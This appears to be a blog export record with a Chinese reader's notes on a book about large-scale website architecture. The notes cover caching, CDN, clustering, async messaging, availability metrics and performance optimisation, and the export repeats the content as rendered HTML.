大型网站技术架\n---\n\n拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。\n\n### 大型网站系统特点\n\n* 高并发、大流量\n* 高可用\n* 海量数据\n* 用户分布广泛，网络情况复杂\n* 安全环境恶劣\n* 需求快速变更、发布频繁\n* 渐进式发展\n\n\n\n## 大型网站架构演化及发展历程\n\n##### 初期网站\n\n![初期应用服务器](websiteInit.jpeg)\n\n##### 最终架构的大型网站\n\n![业务及使用nosql](websiteDisAppAndUseTec.jpeg)\n\n### 演化过程\n\n* 应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器\n* 添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询\n* 使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力\n* 数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库\n* 使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户\n* 使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上\n* 使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持\n* 业务拆分：将不同业务分在不同产品线，每个应用独立部署\n* 分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务\n\n### 网站架构误区\n\n* 一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案\n* 为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义\n* 企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定\n\n## 大型网站架构模式\n\n#### 分层\n\n![分层](hierarchy.jpeg)\n\n大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。\n\n分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构\n\n分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）\n\n#### 分割\n\n如果说分层是对软件的横向切割，那么分割是纵向切割\n\n网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。\n\n大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等\n\n#### 分布式\n\n* 分布式应用和服务： 可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展\n* 分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力\n* 分布式数据及存储：单台机器无法提供海量存储\n* 分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。\n* 分布式配置，分布式锁，分布式文件等\n\n#### 集群\n\n多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器\n\n#### 缓存\n\n缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段\n\n* CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户\n* 反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户\n* 本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速\n* 分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。\n\n使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性\n\n#### 异步\n\n* 提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障\n* 加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少\n* 消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力\n\n#### 冗余\n\n网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。\n\n#### 自动化\n\n网站发布应该具备以下环节\n\n* 发布自动化\n* 代码管理：版本控制\n* 自动化测试：自动检测并发送检测报告\n* 自动化安全检测：对代码进行静态安全扫描部署及攻击测试\n* 自动化部署：自动部署到生产环境\n* 自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰\n* 自动化报警：超出阈值发送邮件报警\n* 自动化失效转移：将失效的服务器从集群隔离\n* 自动化失效恢复：重新启动服务\n* 自动化降级：访问高峰则关闭次要服务\n* 自动化分配资源：将空闲资源合理分配给重要任务\n\n#### 安全\n\n* 密码和手机校验\n* 通信加密\n* 验证码识别\n* 敏感词汇过滤\n* 风险信息控制\n\n## 架构要素\n\n通俗说法：最高层次的规划，难以改变的决定\n\n一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素\n\n* 性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等\n* 可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用\n* 伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制\n* 扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品\n* 安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略\n\n## 网站的高性能架构\n\n#### 不同视角下的性能\n\n* 用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间\n* 开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能\n* 运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等\n\n#### 性能优化策略\n\n* 性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理\n* 性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化\n\n#### 前端优化策略\n\n* 减少http请求\n* 使用浏览器缓存\n* 启动压缩\n* css放在最上面，js放在页面最下面\n* 减少cookie传输\n\n#### CDN加速\n\nCDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度\n\n#### 反向代理\n\n传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求\n\n#### 缓存\n\n* 基本原理： K-V形式存储\n* 合理使用缓存：数据读写比2:1以上使用缓存才有意义\n* 数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读\n* 缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机\n* 缓存预热：提前加载缓存保证缓存可用\n* 缓存穿透：将value为null的情况也加载在缓存中\n\n#### 代码优化\n\n* 多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量\n* 将对象设计成无状态：在多并发时对象不会因多线程导致状态改变\n* 使用局部对象：在方法内创建对象\n* 并发访问使用锁：锁将并发操作转化为顺序操作\n* 资源复用：使用单例模式和对象池\n* 数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能\n* 垃圾回收：垃圾回收机制有利于性能提升\n\n## 网站高可用架构\n\n#### 网站高可用性度量\n\n网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点\n\n网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%\n\n对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。\n\n#### 网站可用性考核\n\n![考核](useWeight.jpeg)\n\n故障分=故障时间（分钟）× 故障权重\n\n#### 高可用的服务\n\n* 服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器\n* 超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器\n* 异步调用：异步调用减少服务器压力\n* 服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）\n* 幂等性设计：服务层必须保证多次调用和一次调用结果一致\n\n#### 数据可用性\n\n* 数据持久性： 多个副本，在某个存储出错后数据不会丢失\n* 数据可访问性：切换数据源时用户无感知\n* 数据一致性：不同副本保证数据一致\n\n#### 网站运行监控\n\n不允许没有监控的系统上线\n\n* 用户行为日志收集\n* 服务器端日志收集\n* 客户端浏览器日志收集\n* 服务器性能监控\n* 运行数据报告\n\n##### 小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\n\n","slug":"《大型网站技术架》读书笔记","published":1,"updated":"2021-10-13T15:40:26.151Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0d001x4jzxme0mwzma","content":"<p>拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。</p><h3 id=\"大型网站系统特点\"><a href=\"#大型网站系统特点\" class=\"headerlink\" title=\"大型网站系统特点\"></a>大型网站系统特点</h3><ul><li>高并发、大流量</li><li>高可用</li><li>海量数据</li><li>用户分布广泛，网络情况复杂</li><li>安全环境恶劣</li><li>需求快速变更、发布频繁</li><li>渐进式发展</li></ul><h2 id=\"大型网站架构演化及发展历程\"><a href=\"#大型网站架构演化及发展历程\" class=\"headerlink\" title=\"大型网站架构演化及发展历程\"></a>大型网站架构演化及发展历程</h2><h5 id=\"初期网站\"><a href=\"#初期网站\" class=\"headerlink\" title=\"初期网站\"></a>初期网站</h5><p><img src=\"/img/loading.gif\" data-original=\"/随笔/《大型网站技术架》读书笔记/websiteInit.jpeg\" alt=\"初期应用服务器\"></p><h5 id=\"最终架构的大型网站\"><a href=\"#最终架构的大型网站\" class=\"headerlink\" title=\"最终架构的大型网站\"></a>最终架构的大型网站</h5><p><img src=\"/img/loading.gif\" data-original=\"/随笔/《大型网站技术架》读书笔记/websiteDisAppAndUseTec.jpeg\" alt=\"业务及使用nosql\"></p><h3 id=\"演化过程\"><a href=\"#演化过程\" class=\"headerlink\" title=\"演化过程\"></a>演化过程</h3><ul><li>应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器</li><li>添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询</li><li>使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力</li><li>数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库</li><li>使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户</li><li>使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上</li><li>使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持</li><li>业务拆分：将不同业务分在不同产品线，每个应用独立部署</li><li>分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务</li></ul><h3 id=\"网站架构误区\"><a href=\"#网站架构误区\" class=\"headerlink\" title=\"网站架构误区\"></a>网站架构误区</h3><ul><li>一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案</li><li>为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义</li><li>企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定</li></ul><h2 id=\"大型网站架构模式\"><a href=\"#大型网站架构模式\" class=\"headerlink\" title=\"大型网站架构模式\"></a>大型网站架构模式</h2><h4 id=\"分层\"><a href=\"#分层\" class=\"headerlink\" title=\"分层\"></a>分层</h4><p><img src=\"/img/loading.gif\" data-original=\"/随笔/《大型网站技术架》读书笔记/hierarchy.jpeg\" alt=\"分层\"></p><p>大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。</p><p>分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构</p><p>分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）</p><h4 id=\"分割\"><a href=\"#分割\" class=\"headerlink\" title=\"分割\"></a>分割</h4><p>如果说分层是对软件的横向切割，那么分割是纵向切割</p><p>网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。</p><p>大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等</p><h4 id=\"分布式\"><a href=\"#分布式\" class=\"headerlink\" title=\"分布式\"></a>分布式</h4><ul><li>分布式应用和服务： 可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展</li><li>分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力</li><li>分布式数据及存储：单台机器无法提供海量存储</li><li>分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。</li><li>分布式配置，分布式锁，分布式文件等</li></ul><h4 id=\"集群\"><a href=\"#集群\" class=\"headerlink\" title=\"集群\"></a>集群</h4><p>多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器</p><h4 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h4><p>缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段</p><ul><li>CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户</li><li>反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户</li><li>本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速</li><li>分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。</li></ul><p>使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性</p><h4 id=\"异步\"><a href=\"#异步\" class=\"headerlink\" title=\"异步\"></a>异步</h4><ul><li>提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障</li><li>加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少</li><li>消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力</li></ul><h4 id=\"冗余\"><a href=\"#冗余\" class=\"headerlink\" title=\"冗余\"></a>冗余</h4><p>网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。</p><h4 id=\"自动化\"><a href=\"#自动化\" class=\"headerlink\" title=\"自动化\"></a>自动化</h4><p>网站发布应该具备以下环节</p><ul><li>发布自动化</li><li>代码管理：版本控制</li><li>自动化测试：自动检测并发送检测报告</li><li>自动化安全检测：对代码进行静态安全扫描部署及攻击测试</li><li>自动化部署：自动部署到生产环境</li><li>自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰</li><li>自动化报警：超出阈值发送邮件报警</li><li>自动化失效转移：将失效的服务器从集群隔离</li><li>自动化失效恢复：重新启动服务</li><li>自动化降级：访问高峰则关闭次要服务</li><li>自动化分配资源：将空闲资源合理分配给重要任务</li></ul><h4 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h4><ul><li>密码和手机校验</li><li>通信加密</li><li>验证码识别</li><li>敏感词汇过滤</li><li>风险信息控制</li></ul><h2 id=\"架构要素\"><a href=\"#架构要素\" class=\"headerlink\" title=\"架构要素\"></a>架构要素</h2><p>通俗说法：最高层次的规划，难以改变的决定</p><p>一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素</p><ul><li>性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等</li><li>可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用</li><li>伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制</li><li>扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品</li><li>安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略</li></ul><h2 id=\"网站的高性能架构\"><a href=\"#网站的高性能架构\" class=\"headerlink\" title=\"网站的高性能架构\"></a>网站的高性能架构</h2><h4 id=\"不同视角下的性能\"><a href=\"#不同视角下的性能\" class=\"headerlink\" title=\"不同视角下的性能\"></a>不同视角下的性能</h4><ul><li>用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间</li><li>开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能</li><li>运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等</li></ul><h4 id=\"性能优化策略\"><a href=\"#性能优化策略\" class=\"headerlink\" title=\"性能优化策略\"></a>性能优化策略</h4><ul><li>性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理</li><li>性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化</li></ul><h4 id=\"前端优化策略\"><a href=\"#前端优化策略\" class=\"headerlink\" title=\"前端优化策略\"></a>前端优化策略</h4><ul><li>减少http请求</li><li>使用浏览器缓存</li><li>启动压缩</li><li>css放在最上面，js放在页面最下面</li><li>减少cookie传输</li></ul><h4 id=\"CDN加速\"><a href=\"#CDN加速\" class=\"headerlink\" title=\"CDN加速\"></a>CDN加速</h4><p>CDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度</p><h4 id=\"反向代理\"><a href=\"#反向代理\" class=\"headerlink\" title=\"反向代理\"></a>反向代理</h4><p>传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求</p><h4 id=\"缓存-1\"><a href=\"#缓存-1\" class=\"headerlink\" title=\"缓存\"></a>缓存</h4><ul><li>基本原理： K-V形式存储</li><li>合理使用缓存：数据读写比2:1以上使用缓存才有意义</li><li>数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读</li><li>缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机</li><li>缓存预热：提前加载缓存保证缓存可用</li><li>缓存穿透：将value为null的情况也加载在缓存中</li></ul><h4 id=\"代码优化\"><a href=\"#代码优化\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h4><ul><li>多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量</li><li>将对象设计成无状态：在多并发时对象不会因多线程导致状态改变</li><li>使用局部对象：在方法内创建对象</li><li>并发访问使用锁：锁将并发操作转化为顺序操作</li><li>资源复用：使用单例模式和对象池</li><li>数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能</li><li>垃圾回收：垃圾回收机制有利于性能提升</li></ul><h2 id=\"网站高可用架构\"><a href=\"#网站高可用架构\" class=\"headerlink\" title=\"网站高可用架构\"></a>网站高可用架构</h2><h4 id=\"网站高可用性度量\"><a href=\"#网站高可用性度量\" class=\"headerlink\" title=\"网站高可用性度量\"></a>网站高可用性度量</h4><p>网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点</p><p>网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%</p><p>对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。</p><h4 id=\"网站可用性考核\"><a href=\"#网站可用性考核\" class=\"headerlink\" title=\"网站可用性考核\"></a>网站可用性考核</h4><p><img src=\"/img/loading.gif\" data-original=\"/随笔/《大型网站技术架》读书笔记/useWeight.jpeg\" alt=\"考核\"></p><p>故障分=故障时间（分钟）× 故障权重</p><h4 id=\"高可用的服务\"><a href=\"#高可用的服务\" class=\"headerlink\" title=\"高可用的服务\"></a>高可用的服务</h4><ul><li>服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器</li><li>超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器</li><li>异步调用：异步调用减少服务器压力</li><li>服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）</li><li>幂等性设计：服务层必须保证多次调用和一次调用结果一致</li></ul><h4 id=\"数据可用性\"><a href=\"#数据可用性\" class=\"headerlink\" title=\"数据可用性\"></a>数据可用性</h4><ul><li>数据持久性： 多个副本，在某个存储出错后数据不会丢失</li><li>数据可访问性：切换数据源时用户无感知</li><li>数据一致性：不同副本保证数据一致</li></ul><h4 id=\"网站运行监控\"><a href=\"#网站运行监控\" class=\"headerlink\" title=\"网站运行监控\"></a>网站运行监控</h4><p>不允许没有监控的系统上线</p><ul><li>用户行为日志收集</li><li>服务器端日志收集</li><li>客户端浏览器日志收集</li><li>服务器性能监控</li><li>运行数据报告</li></ul><h5 id=\"小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\"><a href=\"#小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\" class=\"headerlink\" title=\"小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\"></a>小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。</h5>","site":{"data":{}},"excerpt":"","more":"<p>拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。</p><h3 id=\"大型网站系统特点\"><a href=\"#大型网站系统特点\" class=\"headerlink\" title=\"大型网站系统特点\"></a>大型网站系统特点</h3><ul><li>高并发、大流量</li><li>高可用</li><li>海量数据</li><li>用户分布广泛，网络情况复杂</li><li>安全环境恶劣</li><li>需求快速变更、发布频繁</li><li>渐进式发展</li></ul><h2 id=\"大型网站架构演化及发展历程\"><a href=\"#大型网站架构演化及发展历程\" class=\"headerlink\" title=\"大型网站架构演化及发展历程\"></a>大型网站架构演化及发展历程</h2><h5 id=\"初期网站\"><a href=\"#初期网站\" class=\"headerlink\" title=\"初期网站\"></a>初期网站</h5><p><img src=\"/随笔/《大型网站技术架》读书笔记/websiteInit.jpeg\" alt=\"初期应用服务器\"></p><h5 id=\"最终架构的大型网站\"><a href=\"#最终架构的大型网站\" class=\"headerlink\" title=\"最终架构的大型网站\"></a>最终架构的大型网站</h5><p><img src=\"/随笔/《大型网站技术架》读书笔记/websiteDisAppAndUseTec.jpeg\" alt=\"业务及使用nosql\"></p><h3 id=\"演化过程\"><a href=\"#演化过程\" class=\"headerlink\" title=\"演化过程\"></a>演化过程</h3><ul><li>应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器</li><li>添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询</li><li>使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力</li><li>数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库</li><li>使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户</li><li>使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上</li><li>使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持</li><li>业务拆分：将不同业务分在不同产品线，每个应用独立部署</li><li>分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务</li></ul><h3 id=\"网站架构误区\"><a href=\"#网站架构误区\" class=\"headerlink\" title=\"网站架构误区\"></a>网站架构误区</h3><ul><li>一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案</li><li>为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义</li><li>企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定</li></ul><h2 id=\"大型网站架构模式\"><a href=\"#大型网站架构模式\" class=\"headerlink\" title=\"大型网站架构模式\"></a>大型网站架构模式</h2><h4 id=\"分层\"><a href=\"#分层\" class=\"headerlink\" title=\"分层\"></a>分层</h4><p><img src=\"/随笔/《大型网站技术架》读书笔记/hierarchy.jpeg\" alt=\"分层\"></p><p>大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。</p><p>分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构</p><p>分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）</p><h4 id=\"分割\"><a href=\"#分割\" class=\"headerlink\" title=\"分割\"></a>分割</h4><p>如果说分层是对软件的横向切割，那么分割是纵向切割</p><p>网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。</p><p>大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等</p><h4 id=\"分布式\"><a href=\"#分布式\" class=\"headerlink\" title=\"分布式\"></a>分布式</h4><ul><li>分布式应用和服务： 